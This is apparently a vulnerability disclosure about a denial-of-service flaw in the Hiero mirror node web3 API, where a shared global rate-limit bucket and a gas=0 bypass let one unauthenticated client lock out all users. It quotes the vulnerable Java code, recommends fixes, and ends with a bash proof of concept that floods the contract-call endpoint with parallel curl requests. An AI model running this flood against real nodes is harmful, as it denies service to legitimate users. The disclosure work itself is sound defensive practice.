### Title
Global Rate-Limit Bucket Exhaustion via Unauthenticated Request Flooding (DoS)

### Summary
`ThrottleManagerImpl.throttle()` guards all contract-call requests with a single, process-wide `rateLimitBucket` that has no per-client or per-IP partitioning. Any unauthenticated caller who sends requests at the configured maximum rate (default 500 req/s) will consume every available token, leaving zero capacity for all other users. Because the gas-limit bypass described below makes each attack request nearly free to craft, the attack is trivially repeatable and requires no special privileges.

### Finding Description
**Exact location:** `web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, `throttle()`, lines 37–42; bucket wired in `web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java`, lines 24–32.

**Root cause:** `rateLimitBucket` is a Spring singleton `Bucket` (bucket4j, local, no synchronization strategy set) shared across every incoming HTTP request with no per-IP, per-session, or per-identity dimension:

```java
// ThrottleConfiguration.java lines 24-32
@Bean(name = RATE_LIMIT_BUCKET)
Bucket rateLimitBucket() {
    long rateLimit = throttleProperties.getRequestsPerSecond(); // default 500
    final var limit = Bandwidth.builder()
            .capacity(rateLimit)
            .refillGreedy(rateLimit, Duration.ofSeconds(1))
            .build();
    return Bucket.builder().addLimit(limit).build();
}
```

```java
// ThrottleManagerImpl.java line 38
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
}
```

**Gas-limit bypass (amplifier):** The second guard (`gasLimitBucket`) is skipped when `gas ≤ 10 000` because `scaleGas()` returns `0` and `tryConsume(0)` always returns `true` in bucket4j:

```java
// ThrottleProperties.java lines 42-47
public long scaleGas(long gas) {
    if (gas <= GAS_SCALE_FACTOR) {   // GAS_SCALE_FACTOR = 10_000
        return 0L;
    }
    return Math.floorDiv(gas, GAS_SCALE_FACTOR);
}
```

So an attacker sets `gas=0` (or any value ≤ 10 000) and each request costs exactly 1 token from the global `rateLimitBucket` and 0 tokens from `gasLimitBucket`. Sending 500 such requests per second exhausts the entire bucket, and every subsequent request from any other user receives HTTP 429 "Requests per second rate limit exceeded" until the bucket refills one second later — at which point the attacker immediately drains it again.

**Why existing checks fail:** The `requestFilter` chain (lines 44–48) is only evaluated *after* both bucket checks pass, so it cannot mitigate this. There is no per-IP bucket, no authentication gate, and no infrastructure-level rate limiting visible in the application code.

### Impact Explanation
All legitimate users are denied the ability to submit or simulate transactions via the web3 API for as long as the attacker sustains the flood. Because the mirror node's web3 endpoint is the Ethereum-compatible entry point for transaction gossip, a sustained attack prevents any transaction from being forwarded to the Hedera network through this node. Severity: **High** (availability impact, no confidentiality/integrity component, but complete service denial for all users).

### Likelihood Explanation
The endpoint is unauthenticated and publicly reachable. Sending 500 HTTP requests per second is well within the capability of a single commodity machine or a small botnet. The attack requires no knowledge of the system beyond the public API endpoint and no special credentials. It is fully repeatable and can be sustained indefinitely at negligible cost to the attacker.

### Recommendation
1. **Per-IP rate limiting:** Replace (or supplement) the global `rateLimitBucket` with a per-client bucket keyed on the remote IP address (e.g., using bucket4j's `ProxyManager` backed by a `ConcurrentHashMap` or a distributed cache). Each IP should be limited to a fraction of the global cap.
2. **Fix the gas=0 bypass:** `tryConsume(0)` always succeeds; add a guard so that requests with `scaleGas(gas) == 0` are either rejected or counted against the gas bucket at a minimum cost of 1 token.
3. **Infrastructure layer:** Deploy an API gateway or reverse proxy (e.g., nginx `limit_req`, AWS WAF) in front of the service to enforce per-IP limits before requests reach the JVM.
4. **Authentication:** Require an API key or OAuth token so that abusive clients can be identified and blocked without affecting legitimate users.

### Proof of Concept
```bash
# Exhaust the global rateLimitBucket (default 500 req/s) using curl + parallel
# gas=0 bypasses gasLimitBucket; only rateLimitBucket is consumed

for i in $(seq 1 600); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://<mirror-node-host>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":0,"data":"0x"}' &
done
wait

# After the first 500 requests succeed (HTTP 200), all remaining requests
# and all concurrent legitimate users receive HTTP 429:
# {"_status":{"messages":[{"message":"Requests per second rate limit exceeded"}]}}
```

The 501st and all subsequent requests within the same 1-second window — from any source — receive HTTP 429, confirming full bucket exhaustion by a single unauthenticated client.
